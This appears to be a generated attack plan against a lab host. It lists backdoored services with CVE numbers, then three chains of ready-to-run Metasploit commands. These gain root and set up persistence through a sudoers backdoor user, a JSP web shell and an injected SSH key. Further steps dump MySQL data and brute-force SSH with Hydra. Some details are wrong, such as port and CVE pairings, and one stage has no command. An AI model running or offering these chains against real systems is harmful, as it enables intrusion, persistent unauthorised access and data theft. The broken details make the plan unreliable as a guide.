summary: vsftpd 2.3.4 backdoor (CVE-2011-2523) on port 21 - direct root shell access
ProFTPD 1.3.1 backdoor on port 2121 - high-risk remote code execution
Samba usermap_script (CVE-2007-2447) on ports 139/445 - command execution leading to root
UnrealIRCd backdoor (CVE-2010-2075) on port 6667 - root shell via IRC
Distcc exec (CVE-2004-2687) on port 1524 - unauthenticated remote command execution
Tomcat manager upload (CVE-2009-0580) on port 8180 - web shell deployment

attack_chains.name: Chain 1: FTP Backdoor to Root Shell Persistence

stages.description: Exploit vsftpd 2.3.4 backdoor on port 21 to gain root shell using Metasploit.
commands: msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 192.168.56.5; set RPORT 21; run'
stages.verification: Check for active Meterpreter session with 'sessions -l'; interact via 'sessions -i 1' and run 'whoami' to confirm root.

stages.description: Backdoor provides direct root access; verify and stabilize shell if needed.
commands: In shell: id; if not root, attempt 'sudo -l' or kernel exploits like dirtycow, but unnecessary here.
stages.verification: Run 'id' in shell to confirm uid=0(root); if elevated, proceed.

stages.description: Create a backdoor user for ongoing access.
commands: In root shell: useradd -m backdoor -s /bin/bash; echo 'backdoor:password123' | chpasswd; echo 'backdoor ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
stages.verification: From Kali: ssh backdoor@192.168.56.5 with password; confirm login and 'sudo whoami' returns root.

attack_chains.name: Chain 2: Samba Exploit to Database Access Persistence

stages.description: Exploit Samba usermap_script vulnerability on port 445 to execute commands and gain shell.
commands: msfconsole -q -x 'use exploit/multi/samba/usermap_script; set RHOSTS 192.168.56.5; set RPORT 445; run'
stages.verification: Check Metasploit session with 'sessions -l'; interact and run 'id' to confirm shell (often root).

stages.description: Leverage root shell to access MySQL on port 3306 for data exfil or further pivoting.
commands: In shell: mysql -u root -p'' -h 127.0.0.1; SHOW DATABASES; (empty password often works)
stages.verification: Query 'SELECT user,host FROM mysql.user;' to list users; confirm remote auth and dump data with 'mysqldump -u root -p'' dvwa > /tmp/dump.sql'.

stages.description: Install a cron job for reverse shell persistence.
stages.verification: From Kali: nc -lvnp 4444; wait 1 min and check for incoming shell; verify with 'ps aux | grep cron' on target.

attack_chains.name: Chain 3: IRC Backdoor to Web Shell Persistence

stages.description: Exploit UnrealIRCd backdoor on port 6667 to gain root shell.
commands: msfconsole -q -x 'use exploit/unix/irc/unreal_ircd_3281_backdoor; set RHOSTS 192.168.56.5; set RPORT 6667; run'
stages.verification: List sessions with 'sessions -l'; interact with 'sessions -i 1' and execute 'uname -a' to confirm access.

stages.description: Use root access to deploy a web shell on Apache Tomcat port 8180 via manager upload.
commands: msfconsole -q -x 'use exploit/multi/http/tomcat_mgr_upload; set RHOSTS 192.168.56.5; set RPORT 8180; set HttpUsername tomcat; set HttpPassword tomcat; run'
stages.verification: Access uploaded JSP shell at http://192.168.56.5:8180/examples/jsp/cal.jsp?cmd=whoami; confirm root output.

stages.description: Add SSH key for persistent access.
commands: From Kali, generate key if needed: ssh-keygen -t rsa; cat ~/.ssh/id_rsa.pub | ssh root@192.168.56.5 'mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys'; chmod 700 ~/.ssh; chmod 600 ~/.ssh/authorized_keys
stages.verification: Test SSH: ssh -i ~/.ssh/id_rsa root@192.168.56.5; run 'whoami' to confirm root login without password.

followup_requests: Run full Nikto scan on web ports: nikto -h 192.168.56.5 -p 80,8180 -Tuning x
Enumerate Samba shares deeply: smbclient -L //192.168.56.5 -N; enum4linux -a 192.168.56.5
Brute-force weak creds on SSH/Telnet/VNC: hydra -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt 192.168.56.5 ssh
Vulnerability scan with OpenVAS or Nessus for unlisted CVEs in services like BIND (port 53) and PostgreSQL (port 5432)
Directory brute-force on web: gobuster dir -u http://192.168.56.5 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
